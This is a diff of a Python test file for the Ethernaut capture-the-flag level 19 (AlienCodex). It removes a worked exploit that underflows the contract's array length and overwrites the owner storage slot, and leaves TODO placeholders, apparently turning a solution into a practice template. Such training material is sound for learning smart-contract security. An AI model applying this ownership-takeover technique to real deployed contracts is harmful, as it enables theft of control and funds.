@@ -1,7 +1,7 @@
 from wake.testing import *
 from tests.ethernaut_deployer import EthernautDeployer
 from pytypes.contracts.lv19_alien_codex import AlienCodex
-from pytypes.contracts.attacker.lv19_underflow_calculator import UnderflowCalculator
+# TODO You can import your our own smart contract(s) here.
 
 @default_chain.connect()
 def test_lv19():
@@ -11,13 +11,7 @@ def test_lv19():
     ethernaut.check_lv19(contract)
 
 def exploit_lv19(contract: AlienCodex):
-    # Attack vector: underflow in array.length 
-    # Training: know how storage layout works for arrays
-
-    exploitContract = UnderflowCalculator.deploy()
-    index = exploitContract.calculateTheZeroIndex()
-    myAddress = exploitContract.calculateMyAddressInBytes(from_=default_chain.accounts[1].address)
-    
-    contract.makeContact()
-    contract.retract()
-    contract.revise(index, myAddress)
+    # TODO Claim ownership of the contract.
+    # TODO You can import your our own smart contract(s) here.
+    # TODO Code here ...
+    pass
